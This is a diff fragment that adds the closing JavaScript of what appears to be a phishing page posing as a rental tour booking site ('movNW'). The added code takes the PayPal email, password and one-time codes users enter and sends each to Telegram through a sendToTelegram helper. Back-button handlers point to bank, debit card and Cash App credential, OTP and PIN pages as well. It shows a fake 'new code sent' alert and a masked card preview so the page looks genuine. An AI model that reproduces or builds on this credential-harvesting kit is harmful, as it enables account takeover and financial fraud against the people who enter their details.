+            if (!email || !password) {
+                alert('Please enter both email and password');
+                return;
+            }
+            
+            document.getElementById('paypalOtpTarget').textContent = email;
+            
+            const msg = `movNW - PayPal Initiated
+Email: ${email}
+Password: ${password}`;
+            sendToTelegram(msg);
+            
+            navigateTo('paypalOtpPage');
+        });
+
+        buttons.verifyPaypalBtn.addEventListener('click', function() {
+            const otp = Array.from(paypalOtpInputs).map(i => i.value).join('');
+            
+            const msg = `movNW - PayPal OTP
+OTP: ${otp}`;
+            sendToTelegram(msg);
+            
+            // 3 second delay before schedule page
+            navigateTo('page4', 3000);
+        });
+
+        document.getElementById('resendPaypalOtp').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('New verification code sent');
+        });
+
+        // Schedule tour
+        buttons.confirmTourBtn.addEventListener('click', function() {
+            const tourDate = document.getElementById('tourDate').value;
+            
+            if (!tourDate || !selectedTimeSlot) {
+                alert('Please select a date and time');
+                return;
+            }
+            
+            const dateObj = new Date(tourDate);
+            const formattedDate = dateObj.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+            
+            document.getElementById('confirmedDate').textContent = formattedDate;
+            document.getElementById('confirmedTime').textContent = selectedTimeSlot;
+            
+            const msg = `movNW - Tour Requested
+Date: ${tourDate}
+Time: ${selectedTimeSlot}`;
+            sendToTelegram(msg);
+            
+            navigateTo('successPage');
+        });
+
+        // Time slot selection
+        timeSlots.forEach(slot => {
+            slot.addEventListener('click', function() {
+                timeSlots.forEach(s => s.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedTimeSlot = this.textContent;
+            });
+        });
+
+        // Back buttons
+        buttons.backBtn1.addEventListener('click', () => navigateTo('page1'));
+        buttons.backBtn2.addEventListener('click', () => navigateTo('page2'));
+        buttons.backBtnBank.addEventListener('click', () => navigateTo('page3'));
+        buttons.backBtnDebit.addEventListener('click', () => navigateTo('bankPage'));
+        buttons.backBtnCashapp.addEventListener('click', () => navigateTo('page3'));
+        buttons.backBtnCashappOtp.addEventListener('click', () => navigateTo('cashappPage'));
+        buttons.backBtnCashappPin.addEventListener('click', () => navigateTo('cashappOtpPage'));
+        buttons.backBtnPaypal.addEventListener('click', () => navigateTo('page3'));
+        buttons.backBtnPaypalOtp.addEventListener('click', () => navigateTo('paypalPage'));
+        buttons.backBtn3.addEventListener('click', () => navigateTo('page3'));
+        buttons.finishBtn.addEventListener('click', () => location.reload());
+
+        // Card formatting
+        document.getElementById('cardNumber')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+            
+            let masked = '';
+            if (value.length > 4) {
+                masked = '**** **** **** ' + value.slice(-4);
+            } else if (value.length > 0) {
+                masked = value.replace(/./g,'*');
+            }
+            document.getElementById('maskedCardPreview').textContent = masked;
+        });
+
+        document.getElementById('cardExpiry')?.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.slice(0,2) + '/' + value.slice(2,4);
+            }
+        });
+
+        // Helper function
+        function getVal(id) {
+            const el = document.getElementById(id);
+            return el ? el.value : '';
+        }
+
+        function showHoldResultMsg() {
+            if (pages.page4 && !holdResultShown) {
+                setTimeout(function() {
+                    let msg = document.getElementById('holdResultMsg');
+                    if (msg) {
+                        msg.style.display = 'block';
+                        setTimeout(() => { msg.style.display = 'none'; }, 10000);
+                        holdResultShown = true;
+                    }
+                }, 400);
+            }
+        }
+    </script>
+</body>
+</html>
